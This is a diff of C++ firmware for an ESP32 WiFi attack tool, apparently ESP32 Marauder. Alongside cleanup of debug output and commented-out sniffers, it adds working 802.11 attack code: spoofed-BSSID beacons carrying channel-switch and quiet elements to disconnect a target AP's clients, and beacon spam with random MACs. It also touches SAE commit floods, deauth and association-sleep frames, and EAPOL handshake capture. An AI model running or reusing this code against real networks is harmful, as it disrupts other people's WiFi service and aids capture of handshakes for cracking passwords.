@@ -6492,7 +6421,7 @@ String WiFiScan::processPwnagotchiBeacon(const uint8_t* frame, int length) {
   while (jsonEndIndex > jsonStartIndex && frame[jsonEndIndex - 1] != '}') jsonEndIndex--;
 
   if (jsonStartIndex >= jsonEndIndex) {
-    Serial.println(F("JSON payload not found."));
+    //Serial.println(F("JSON payload not found."));
     return "";
   }
 
@@ -6504,7 +6433,7 @@ String WiFiScan::processPwnagotchiBeacon(const uint8_t* frame, int length) {
 
   // Check if we have enough memory before creating StaticJsonDocument
   if (jsonCapacity > ESP.getFreeHeap()) {
-    Serial.println(F("Insufficient memory to parse JSON."));
+    //Serial.println(F("Insufficient memory to parse JSON."));
     return "";
   }
 
@@ -6546,8 +6475,9 @@ String WiFiScan::processPwnagotchiBeacon(const uint8_t* frame, int length) {
     #endif
 
     return String("Pwnagotchi: ") + name + ", \nPwnd: " + String(pwnd_tot) + ", \nVer: " + ver;
-  } else {
-    Serial.println(F("Not a Pwnagotchi frame."));
+  } 
+  else {
+    //Serial.println(F("Not a Pwnagotchi frame."));
     return "";
   }
 }
@@ -7229,10 +7159,10 @@ void WiFiScan::saeAttackLoop(uint32_t currentTime) {
 
       
       if (!this->sendSAECommitFrame(access_points->get(i).bssid, rand_source_mac)) {
-        Serial.print(F("FAILED TX SAE Commit -> "));
-        Serial.print(access_points->get(i).essid);
-        Serial.print(F(" "));
-        Serial.println(millis());
+        //Serial.print(F("FAILED TX SAE Commit -> "));
+        //Serial.print(access_points->get(i).essid);
+        //Serial.print(F(" "));
+        //Serial.println(millis());
       }
     }
   }
@@ -7564,8 +7494,7 @@ bool WiFiScan::getSAEACT(const uint8_t *frame, size_t frame_len, uint16_t &group
   return true;
 }*/
 
-void WiFiScan::beaconSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
-{
+void WiFiScan::beaconSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
   extern WiFiScan wifi_scan_obj;
 
   #ifdef HAS_GPS
@@ -7677,13 +7606,13 @@ void WiFiScan::beaconSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type
           delay(random(0, 10));
           Serial.print(snifferPacket->rx_ctrl.rssi);
           Serial.print(F(" Ch: "));
-          Serial.print(snifferPacket->rx_ctrl.channel);
-          Serial.print(F(" BSSID: "));
+          Serial.print((String)snifferPacket->rx_ctrl.channel + " ");
+          //Serial.print(F(" BSSID: "));
           char addr[] = "00:00:00:00:00:00";
           getMAC(addr, snifferPacket->payload, 10);
           Serial.print(addr);
-          Serial.print(F(" ESSID Len: "));
-          Serial.print((String)snifferPacket->payload[37]);
+          //Serial.print(F(" ESSID Len: "));
+          //Serial.print((String)snifferPacket->payload[37]);
           Serial.print(F(" ESSID: "));
           #ifdef HAS_FULL_SCREEN
             display_string.concat(snifferPacket->rx_ctrl.rssi);
@@ -7853,7 +7782,7 @@ void WiFiScan::beaconSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type
 
           buffer_obj.append(snifferPacket, len);
         }
-        else if (wifi_scan_obj.currentScanMode == WIFI_SCAN_STATION_WAR_DRIVE) {
+        /*else if (wifi_scan_obj.currentScanMode == WIFI_SCAN_STATION_WAR_DRIVE) {
           #ifdef HAS_GPS
             if (gps_obj.getGpsModuleStatus()) {
               bool do_save = false;  
@@ -7866,9 +7795,8 @@ void WiFiScan::beaconSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type
 
               Serial.print(snifferPacket->rx_ctrl.rssi);
               Serial.print(F(" Ch: "));
-              Serial.print(snifferPacket->rx_ctrl.channel);
+              Serial.print((String)snifferPacket->rx_ctrl.channel + " ");
 
-              Serial.print(F(" BSSID: "));
               Serial.print(addr);
               display_string.concat(addr);
 
@@ -7896,7 +7824,6 @@ void WiFiScan::beaconSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type
 
               Serial.println();
 
-              //wifi_scan_obj.save_mac(reinterpret_cast<unsigned char*>(addr));
 
               if (do_save) {
                 String wardrive_line = (String)addr + "," + (String)addr + ",," + gps_obj.getDatetime() + "," + (String)snifferPacket->rx_ctrl.channel + "," + (String)snifferPacket->rx_ctrl.rssi + "," + gps_obj.getLat() + "," + gps_obj.getLon() + "," + gps_obj.getAlt() + "," + gps_obj.getAccuracy() + ",WIFI";
@@ -7905,7 +7832,7 @@ void WiFiScan::beaconSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type
               }
             }
           #endif
-        }
+        }*/
       }
     }
   }
@@ -8185,9 +8112,45 @@ void WiFiScan::beaconSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type
       }
     }
   }
+  else if (wifi_scan_obj.currentScanMode == WIFI_SCAN_DEAUTH) {
+    if (type == WIFI_PKT_MGMT) {
+      if ((snifferPacket->payload[0] == 0xA0 || snifferPacket->payload[0] == 0xC0 )) {
+        Serial.print(snifferPacket->rx_ctrl.rssi);
+        Serial.print(F(" Ch: "));
+        Serial.print((String)snifferPacket->rx_ctrl.channel + " ");
+        Serial.print(macToString(src_addr));
+        Serial.print(F(" -> "));
+        Serial.print(macToString(dst_addr));
+
+        #ifdef HAS_SCREEN
+          display_string.concat(snifferPacket->rx_ctrl.rssi);
+
+          display_string.concat(" ");
+          display_string.concat((String)snifferPacket->rx_ctrl.channel);
+          display_string.concat(" ");
+          display_string.concat(macToString(src_addr));
+          display_string.concat(" > ");
+          display_string.concat(macToString(dst_addr));
+
+          for (int i = 0; i < 19 - snifferPacket->payload[37]; i++)
+          {
+            display_string.concat(" ");
+          }
+    
+          Serial.print(F(" "));
+    
+          display_obj.display_buffer->add(display_string);
+        #endif
+        
+        Serial.println();
+
+        buffer_obj.append(snifferPacket, len);
+      }
+    }
+  }
 }
 
-void WiFiScan::stationSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+/*void WiFiScan::stationSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
   extern WiFiScan wifi_scan_obj;
   wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
   WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
@@ -8201,12 +8164,6 @@ void WiFiScan::stationSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t typ
 
   if (type != WIFI_PKT_DATA)
     return;
-  /*{
-    len -= 4;
-    int fctl = ntohs(frameControl->fctl);
-    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
-    const WifiMgmtHdr *hdr = &ipkt->hdr;
-  }*/
 
   char ap_addr[] = "00:00:00:00:00:00";
   char dst_addr[] = "00:00:00:00:00:00";
@@ -8253,10 +8210,6 @@ void WiFiScan::stationSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t typ
     else
       frame_offset = 10;
   }
-  /*  Stuff to care about now
-   *  ap_is_src
-   *  ap_index
-   */
   
 
   // Check if we already have this station
@@ -8265,10 +8218,8 @@ void WiFiScan::stationSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t typ
     mac_match = true;
     
     for (int x = 0; x < 6; x++) {
-      //Serial.println((String)snifferPacket->payload[x + 10] + " | " + (String)access_points->get(i).bssid[x]);
       if (snifferPacket->payload[x + frame_offset] != stations->get(i).mac[x]) {
         mac_match = false;
-        //Serial.println("MACs do not match");
         break;
       }
     }
@@ -8323,7 +8274,6 @@ void WiFiScan::stationSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t typ
   //display_string.concat(replaceOUIWithManufacturer(sta_addr));
   display_string.concat(sta_addr);
 
-  //display_string.concat(sta_addr);
   display_string.concat(" -> ");
   display_string.concat(access_points->get(ap_index).essid);
 
@@ -8340,8 +8290,6 @@ void WiFiScan::stationSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t typ
     display_obj.display_buffer->add(display_string);
   #endif
 
-  // Add station index to AP in list
-  //access_points->get(ap_index).stations->add(stations->size() - 1);
 
   if (mem_check) {
     AccessPoint ap = access_points->get(ap_index);
@@ -8351,7 +8299,7 @@ void WiFiScan::stationSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t typ
   }
 
   buffer_obj.append(snifferPacket, len);
-}
+}*/
 
 /*void WiFiScan::rawSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
 {
@@ -8441,7 +8389,7 @@ void WiFiScan::stationSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t typ
   buffer_obj.append(snifferPacket, len);
 }*/
 
-void WiFiScan::deauthSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
+/*void WiFiScan::deauthSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
 {
   wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
   WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
@@ -8468,8 +8416,8 @@ void WiFiScan::deauthSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type
       delay(random(0, 10));
       Serial.print(snifferPacket->rx_ctrl.rssi);
       Serial.print(F(" Ch: "));
-      Serial.print(snifferPacket->rx_ctrl.channel);
-      Serial.print(F(" BSSID: "));
+      Serial.print((String)snifferPacket->rx_ctrl.channel + " ");
+      //Serial.print(F(" BSSID: "));
       char addr[] = "00:00:00:00:00:00";
       char dst_addr[] = "00:00:00:00:00:00";
       getMAC(addr, snifferPacket->payload, 10);
@@ -8499,7 +8447,7 @@ void WiFiScan::deauthSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type
       buffer_obj.append(snifferPacket, len);
     }
   }
-}
+}*/
 
 /*void WiFiScan::probeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
 
@@ -8642,7 +8590,7 @@ void WiFiScan::deauthSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type
   }
 }*/
 
-void WiFiScan::beaconListSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+/*void WiFiScan::beaconListSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
   wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
   WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
   wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
@@ -8719,117 +8667,188 @@ void WiFiScan::beaconListSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t 
       buffer_obj.append(snifferPacket, len);
     }
   }
-}
+}*/
 
-void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_ssid) {
+void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_ssid, int scan_mode) {
+  uint8_t target_channel = custom_ssid.channel;
+
+  // Get post-essid stuff ready
+  const uint8_t* post = nullptr;
+  int post_len = 0;
+
+  static const uint8_t post_base[] = {
+    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+    0x03, 0x01, 0x04, 0x30, 0x18, 0x01, 0x00, 0x00, 0x0f, 0xac, 
+    0x02, 0x02, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 
+    0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00
+  };
+
+  static const uint8_t post_csa[] = {
+    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+    0x03, 0x01, 0x00,
+    0x25, 0x03, 0x01, 0x00, 0xff
+  };
+
+  static const uint8_t post_quiet[] = {
+    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+    0x03, 0x01, 0x00, 0x07, 0x06, 0x55, 0x53, 0x20,
+    0x64, 0x0b, 0x14, 0x20, 0x01, 0x00, 0x05, 0x04, 0x00, 0x01,
+    0x00, 0x00, 0x32, 0x04, 0x0c, 0x12, 0x18, 0x60, 0x28, 0x06,
+    0x01, 0x05, 0xff, 0xff, 0x00, 0x64
+  };
+
+  // Determine channels based on attack
   #ifndef HAS_DUAL_BAND
-    set_channel = random(1,12); 
+    set_channel = random(1,15); 
   #else
     set_channel = dual_band_channels[random(0, DUAL_BAND_CHANNELS)];
   #endif
+  if (scan_mode == WIFI_ATTACK_CSA) {
+    set_channel = custom_ssid.channel;
+    while (target_channel == custom_ssid.channel) {
+      #ifndef HAS_DUAL_BAND
+        target_channel = random(1,15);
+      #else
+        target_channel = dual_band_channels[random(0, DUAL_BAND_CHANNELS)];
+      #endif
+    }
+  } else if (scan_mode == WIFI_ATTACK_QUIET) {
+    set_channel = custom_ssid.channel;
+  } else if (scan_mode == WIFI_ATTACK_AP_SPAM) {
+    set_channel = custom_ssid.channel;
+  }
+
   this->changeChannel(this->set_channel);
-  delay(1);  
+  delay(1);
 
-  //if (custom_ssid.beacon->size() == 0)
-  //  return;
+  // Figure out what's going at the end and the lengths
+  uint8_t temp[64]; // big enough for worst case
+  if (scan_mode == WIFI_ATTACK_CSA) {
+    memcpy(temp, post_csa, sizeof(post_csa));
+    temp[12] = custom_ssid.channel;
+    temp[16] = target_channel;
+    post = temp;
+    post_len = sizeof(post_csa);
+  } else if (scan_mode == WIFI_ATTACK_QUIET) {
+    memcpy(temp, post_quiet, sizeof(post_quiet));
+    temp[12] = custom_ssid.channel;
+    post = temp;
+    post_len = sizeof(post_quiet);
+  } else {
+    post = post_base;
+    post_len = sizeof(post_base);
+  }
 
-
-  // Randomize SRC MAC
-  // Randomize SRC MAC
-  packet[10] = packet[16] = random(256);
-  packet[11] = packet[17] = random(256);
-  packet[12] = packet[18] = random(256);
-  packet[13] = packet[19] = random(256);
-  packet[14] = packet[20] = random(256);
-  packet[15] = packet[21] = random(256);
-
+  // Figure out ESSID stuff and lengths based on attack type
   char ESSID[custom_ssid.essid.length() + 1] = {};
   custom_ssid.essid.toCharArray(ESSID, custom_ssid.essid.length() + 1);
 
   int realLen = strlen(ESSID);
-  int ssidLen = random(realLen, 33);
+  int ssidLen = realLen;
+  if ((scan_mode != WIFI_ATTACK_CSA) &&
+      (scan_mode != WIFI_ATTACK_QUIET))
+    ssidLen = random(realLen, 33);
+
   int numSpace = ssidLen - realLen;
-  //int rand_len = sizeof(rand_reg);
   int fullLen = ssidLen;
-  packet[37] = fullLen;
 
-  // Insert my tag
+  int frame_len = 37 + post_len + fullLen + 1;
+
+  uint8_t temp_frame[frame_len];
+  memcpy(temp_frame, packet, frame_len);
+
+  // Set source address based on attack
+  if ((scan_mode != WIFI_ATTACK_CSA) &&
+      (scan_mode != WIFI_ATTACK_QUIET)) {
+    temp_frame[10] = temp_frame[16] = (random(256) & 0xFE) | 0x02;
+    temp_frame[11] = temp_frame[17] = random(256);
+    temp_frame[12] = temp_frame[18] = random(256);
+    temp_frame[13] = temp_frame[19] = random(256);
+    temp_frame[14] = temp_frame[20] = random(256);
+    temp_frame[15] = temp_frame[21] = random(256);
+  } else {
+    temp_frame[10] = temp_frame[16] = custom_ssid.bssid[0];
+    temp_frame[11] = temp_frame[17] = custom_ssid.bssid[1];
+    temp_frame[12] = temp_frame[18] = custom_ssid.bssid[2];
+    temp_frame[13] = temp_frame[19] = custom_ssid.bssid[3];
+    temp_frame[14] = temp_frame[20] = custom_ssid.bssid[4];
+    temp_frame[15] = temp_frame[21] = custom_ssid.bssid[5];
+  }
+
+  temp_frame[37] = fullLen;
+
   for(int i = 0; i < realLen; i++)
-    packet[38 + i] = ESSID[i];
+    temp_frame[38 + i] = ESSID[i];
 
-  for(int i = 0; i < numSpace; i++)
-    packet[38 + realLen + i] = 0x20;
+  if ((scan_mode != WIFI_ATTACK_CSA) &&
+      (scan_mode != WIFI_ATTACK_QUIET)) {
+    for(int i = 0; i < numSpace; i++)
+      temp_frame[38 + realLen + i] = 0x20;
 
-  /////////////////////////////
+    temp_frame[50 + fullLen] = set_channel;
+  }
+
+  memcpy(temp_frame + (38 + fullLen), post, post_len);
+
+  temp_frame[34] = custom_ssid.beacon[0];
+  temp_frame[35] = custom_ssid.beacon[1];
   
-  packet[50 + fullLen] = set_channel;
+  for (int i = 0; i < 2; i++)
+    esp_wifi_80211_tx(WIFI_IF_AP, temp_frame, sizeof(temp_frame), false);
 
-  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
-                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };
-
-
-
-  // Add everything that goes after the SSID
-  //for(int i = 0; i < 12; i++) 
-  //  packet[38 + fullLen + i] = postSSID[i];
-
-  //packet[34] = custom_ssid.beacon->get(0);
-  //packet[35] = custom_ssid.beacon->get(1);
-  packet[34] = custom_ssid.beacon[0];
-  packet[35] = custom_ssid.beacon[1];
-  
-
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-
-  packets_sent = packets_sent + 3;
+  packets_sent = packets_sent + 2;
 }
 
 void WiFiScan::broadcastCustomBeacon(uint32_t current_time, ssid custom_ssid) {
   set_channel = custom_ssid.channel;
-  this->changeChannel(this->set_channel);
-  delay(1);  
 
-  // Randomize SRC MAC
-  packet[10] = packet[16] = custom_ssid.bssid[0];
-  packet[11] = packet[17] = custom_ssid.bssid[1];
-  packet[12] = packet[18] = custom_ssid.bssid[2];
-  packet[13] = packet[19] = custom_ssid.bssid[3];
-  packet[14] = packet[20] = custom_ssid.bssid[4];
-  packet[15] = packet[21] = custom_ssid.bssid[5];
+  const uint8_t* post = nullptr;
+
+  static const uint8_t post_base[] = {
+    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+    0x03, 0x01, 0x04, 0x30, 0x18, 0x01, 0x00, 0x00, 0x0f, 0xac, 
+    0x02, 0x02, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 
+    0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00
+  };
+
+  int post_len = sizeof(post_base);
 
   char ESSID[custom_ssid.essid.length() + 1] = {};
   custom_ssid.essid.toCharArray(ESSID, custom_ssid.essid.length() + 1);
 
   int ssidLen = strlen(ESSID);
-  //int rand_len = sizeof(rand_reg);
   int fullLen = ssidLen;
-  packet[37] = fullLen;
 
-  // Insert my tag
+  int frame_len = 37 + post_len + fullLen + 1;
+
+  uint8_t temp_frame[frame_len];
+  memcpy(temp_frame, packet, frame_len);
+
+  this->changeChannel(this->set_channel);
+  delay(1);  
+
+  // Randomize SRC MAC
+  temp_frame[10] = temp_frame[16] = custom_ssid.bssid[0];
+  temp_frame[11] = temp_frame[17] = custom_ssid.bssid[1];
+  temp_frame[12] = temp_frame[18] = custom_ssid.bssid[2];
+  temp_frame[13] = temp_frame[19] = custom_ssid.bssid[3];
+  temp_frame[14] = temp_frame[20] = custom_ssid.bssid[4];
+  temp_frame[15] = temp_frame[21] = custom_ssid.bssid[5];
+
+  temp_frame[37] = fullLen;
+
   for(int i = 0; i < ssidLen; i++)
-    packet[38 + i] = ESSID[i];
+    temp_frame[38 + i] = ESSID[i];
 
-  /////////////////////////////
   
-  packet[50 + fullLen] = set_channel;
+  temp_frame[50 + fullLen] = set_channel;
 
-  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
-                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };
-
-
-
-  // Add everything that goes after the SSID
-  for(int i = 0; i < 12; i++) 
-    packet[38 + fullLen + i] = postSSID[i];
+  memcpy(temp_frame + (38 + fullLen), post_base, post_len);
   
+  for (int i = 0; i < 2; i++)
+    esp_wifi_80211_tx(WIFI_IF_AP, temp_frame, sizeof(temp_frame), false);
 
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-
-  packets_sent = packets_sent + 3;
+  packets_sent = packets_sent + 2;
 }
 
 // Function to send beacons with random ESSID length
@@ -8884,50 +8903,54 @@ void WiFiScan::broadcastSetSSID(uint32_t current_time, const char* ESSID) {
 
 // Function for sending crafted beacon frames
 void WiFiScan::broadcastRandomSSID(uint32_t currentTime) {
+  static const uint8_t post_base[] = {
+    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+    0x03, 0x01, 0x04, 0x30, 0x18, 0x01, 0x00, 0x00, 0x0f, 0xac, 
+    0x02, 0x02, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 
+    0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00
+  };
 
-  #ifndef HAS_DUAL_BAND
+  int ssidLen = random(1, 33);
+  int fullLen = ssidLen;
+
+  /*#ifndef HAS_DUAL_BAND
     set_channel = random(1,12); 
   #else
     set_channel = dual_band_channels[random(0, DUAL_BAND_CHANNELS)];
   #endif
   this->changeChannel(this->set_channel);
-  delay(1);  
+  delay(1);*/
 
   // Randomize SRC MAC
-  packet[10] = packet[16] = random(256);
-  packet[11] = packet[17] = random(256);
-  packet[12] = packet[18] = random(256);
-  packet[13] = packet[19] = random(256);
-  packet[14] = packet[20] = random(256);
-  packet[15] = packet[21] = random(256);
 
-  packet[37] = 6;
+  int frame_len = 37 + sizeof(post_base) + fullLen + 1;
+
+
+  uint8_t temp_frame[frame_len];
+  memcpy(temp_frame, packet, frame_len);
+
+  temp_frame[10] = temp_frame[16] = (random(256) & 0xFE) | 0x02;
+  temp_frame[11] = temp_frame[17] = random(256);
+  temp_frame[12] = temp_frame[18] = random(256);
+  temp_frame[13] = temp_frame[19] = random(256);
+  temp_frame[14] = temp_frame[20] = random(256);
+  temp_frame[15] = temp_frame[21] = random(256);
+
+  temp_frame[37] = ssidLen;
   
+  for (int i = 0; i < ssidLen; i++)
+    temp_frame[38 + i] = alfa[random(65)];
   
-  // Randomize SSID (Fixed size 6. Lazy right?)
-  packet[38] = alfa[random(65)];
-  packet[39] = alfa[random(65)];
-  packet[40] = alfa[random(65)];
-  packet[41] = alfa[random(65)];
-  packet[42] = alfa[random(65)];
-  packet[43] = alfa[random(65)];
-  
-  packet[56] = set_channel;
+  temp_frame[50 + fullLen] = set_channel;
 
-  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
-                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };
+  int post_len = sizeof(post_base);
 
+  memcpy(temp_frame + (38 + fullLen), post_base, post_len);
 
+  for (int i = 0; i < 2; i++)
+    esp_wifi_80211_tx(WIFI_IF_AP, temp_frame, sizeof(temp_frame), false);
 
-  // Add everything that goes after the SSID
-  for(int i = 0; i < 12; i++) 
-    packet[38 + 6 + i] = postSSID[i];
-
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-  //ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false));
-  //ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false));
-
-  packets_sent = packets_sent + 3;
+  packets_sent = packets_sent + 2;
 }
 
 // Function to send probe flood to all "active" access points
@@ -9055,7 +9078,7 @@ void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
   packets_sent = packets_sent + 3;
 }
 
-void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, String dst_mac_str) {
+/*void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, String dst_mac_str) {
   // Itterate through all access points in list
   // Check if active
   WiFiScan::set_channel = channel;
@@ -9087,7 +9110,7 @@ void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, String dst_mac_str
   esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
 
   packets_sent = packets_sent + 3;
-}
+}*/
 
 void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, uint8_t mac[6], uint8_t sec) {
   WiFiScan::set_channel = channel;
@@ -9316,7 +9339,7 @@ void WiFiScan::sendAssociationSleep(const char* ESSID, uint8_t bssid[6], int cha
   packets_sent = packets_sent + 1;
 }
 
-void WiFiScan::sendAssociationSleep(const char* ESSID, uint8_t bssid[6], int channel, String dst_mac_str) {
+/*void WiFiScan::sendAssociationSleep(const char* ESSID, uint8_t bssid[6], int channel, String dst_mac_str) {
   WiFiScan::set_channel = channel;
   this->changeChannel(channel);
   delay(1);
@@ -9341,15 +9364,12 @@ void WiFiScan::sendAssociationSleep(const char* ESSID, uint8_t bssid[6], int cha
   association_packet[20] = bssid[4];
   association_packet[21] = bssid[5];
 
-  /* Set Sequence Control */
   association_packet[23] = (sequence_number >> 8) & 0xFF; // Sequence Number MSB
   association_packet[22] = sequence_number & 0xFF;        // Sequence Number LSB
 
-  /* SSID tag */
   association_packet[29] = (uint8_t)strlen((char *)ESSID); // SSID Length
   memcpy(&association_packet[30], ESSID, strlen((char *)ESSID)); // SSID
 
-  /* Supported Rates tag */
   uint16_t offset = 30 + strlen((char *)ESSID); // Offset after SSID);
   association_packet[offset++] = 0x01; // Supported Rates tag
   association_packet[offset++] = 0x04; // Length
@@ -9358,19 +9378,16 @@ void WiFiScan::sendAssociationSleep(const char* ESSID, uint8_t bssid[6], int cha
   association_packet[offset++] = 0x0b;  // 5.5 Mbps
   association_packet[offset++] = 0x16;  // 11 Mbps
 
-  /* Power Capability tag */
   association_packet[offset++] = 0x21; // Power Capability tag
   association_packet[offset++] = 0x02; // Length
   association_packet[offset++] = 0x01; // Min Tx Power
   association_packet[offset++] = 0x15; // Max Tx Power
 
-  /* Supported Channels tag */
   association_packet[offset++] = 0x24; // Supported Channels tag
   association_packet[offset++] = 0x02; // Length
   association_packet[offset++] = 0x01; // First Channel
   association_packet[offset++] = 0x0d; // Last Channel
 
-  /* RSN tag */
   association_packet[offset++] = 0x30; // RSN tag
   association_packet[offset++] = 0x14; // Length
   association_packet[offset++] = 0x01; // Version MSB
@@ -9394,11 +9411,9 @@ void WiFiScan::sendAssociationSleep(const char* ESSID, uint8_t bssid[6], int cha
   association_packet[offset++] = 0x0c; // RSN Capabilities MSB
   association_packet[offset++] = 0x00; // RSN Capabilities LSB
 
-  /* Supported Operating Classes tag */
   association_packet[offset++] = 0x3b; // Supported Operating Classes tag
   association_packet[offset++] = 0x14; // Length
   association_packet[offset++] = 0x51; // Current Operating Class 1 (2.4 GHz)
-  /* alternate Operating Class */
   association_packet[offset++] = 0x86; // Operating Class 2 (5 GHz)
   association_packet[offset++] = 0x85; // Operating Class 3 (6 GHz)
   association_packet[offset++] = 0x84; // Operating Class 4 (60 GHz)
@@ -9419,7 +9434,6 @@ void WiFiScan::sendAssociationSleep(const char* ESSID, uint8_t bssid[6], int cha
   association_packet[offset++] = 0x73; // Operating Class 19 (60 GHz)
   association_packet[offset++] = 0x51; // Operating Class 20 (2.4 GHz)
 
-  /* Vendor Specific tag */
   association_packet[offset++] = 0xdd; // Vendor Specific tag
   association_packet[offset++] = 0x0a; // Length
   association_packet[offset++] = 0x00;
@@ -9437,7 +9451,7 @@ void WiFiScan::sendAssociationSleep(const char* ESSID, uint8_t bssid[6], int cha
   esp_wifi_80211_tx(WIFI_IF_AP, association_packet, offset, false);
 
   packets_sent = packets_sent + 1;
-}
+}*/
 
 void WiFiScan::sendBadMsgAttack(uint32_t currentTime, bool all) {
   if (!all) {
@@ -9495,7 +9509,7 @@ void WiFiScan::sendAssocSleepAttack(uint32_t currentTime, bool all) {
   }
 }
 
-void WiFiScan::sendDeauthAttack(uint32_t currentTime, String dst_mac_str) {
+/*void WiFiScan::sendDeauthAttack(uint32_t currentTime, String dst_mac_str) {
   // Itterate through all access points in list
   for (int i = 0; i < access_points->size(); i++) {
 
@@ -9532,11 +9546,10 @@ void WiFiScan::sendDeauthAttack(uint32_t currentTime, String dst_mac_str) {
       packets_sent = packets_sent + 3;
     }
   }
-}
+}*/
 
 
-void WiFiScan::wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
-{
+void WiFiScan::wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
   extern WiFiScan wifi_scan_obj;
   wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
   WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
@@ -9756,24 +9769,117 @@ void WiFiScan::wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
   }
 }
 
-void WiFiScan::eapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
-{
+uint32_t WiFiScan::getCompleteEapol(int check_index) {
+  uint32_t total_complete = 0;
+  if (check_index < 0) {
+    for (int i = 0; i < access_points->size(); i++) {
+      if ((access_points->get(i).has_msg_1) &&
+          (access_points->get(i).has_msg_2) &&
+          (access_points->get(i).has_msg_3) &&
+          (access_points->get(i).has_msg_4))
+        total_complete++;
+    }
+  } else {
+    if ((access_points->get(check_index).has_msg_1) &&
+        (access_points->get(check_index).has_msg_2) &&
+        (access_points->get(check_index).has_msg_3) &&
+        (access_points->get(check_index).has_msg_4))
+      total_complete++;
+  }
+
+  return total_complete;
+}
+
+void WiFiScan::eapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
   extern WiFiScan wifi_scan_obj;
-  bool send_deauth = settings_obj.loadSetting<bool>(text_table4[5]);
+
+  bool is_beacon = false;
+  bool is_eapol = false;
